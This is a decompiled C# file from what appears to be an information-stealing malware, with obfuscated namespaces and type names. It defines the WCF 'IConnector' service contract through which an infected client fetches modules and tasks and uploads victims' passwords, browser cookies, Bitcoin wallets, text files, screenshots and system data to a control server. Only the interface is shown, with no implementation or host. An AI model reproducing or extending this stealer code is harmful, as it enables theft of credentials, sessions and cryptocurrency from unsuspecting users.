using System;
using System.Collections.Generic;
using System.ServiceModel;
using System.Threading.Tasks;
using MainModule.Classes;
using Omdagerssss;

namespace Dodjins
{
	// Token: 0x0200000F RID: 15
	[ServiceContract(CallbackContract = typeof(Callbacie81ks))]
	public interface IConnector
	{
		// Token: 0x0600004E RID: 78
		[OperationContract]
		Task<List<ModuleFile>> GetModuleList();

		// Token: 0x0600004F RID: 79
		[OperationContract]
		Task Subscribe(SubInfo info);

		// Token: 0x06000050 RID: 80
		[OperationContract]
		Task RecieveImage(byte[] image);

		// Token: 0x06000051 RID: 81
		[OperationContract]
		Task<List<AvaliableTask>> GetTasks(SubInfo info);

		// Token: 0x06000052 RID: 82
		[OperationContract]
		Task CompleteTask(SubInfo info, int id);

		// Token: 0x06000053 RID: 83
		[OperationContract]
		Task SendAllData(SubInfo info, AllInfo allInfo);

		// Token: 0x06000054 RID: 84
		[OperationContract]
		Task SendPasswords(SubInfo info, UserLog allInfo);

		// Token: 0x06000055 RID: 85
		[OperationContract]
		Task SendCookies(SubInfo info, List<BrowserCookie> cookie);

		// Token: 0x06000056 RID: 86
		[OperationContract]
		Task SendWallets(SubInfo info, List<BitcoinWallet> wallets);

		// Token: 0x06000057 RID: 87
		[OperationContract]
		Task SendTxt(SubInfo info, List<TextFile> text);
	}
}
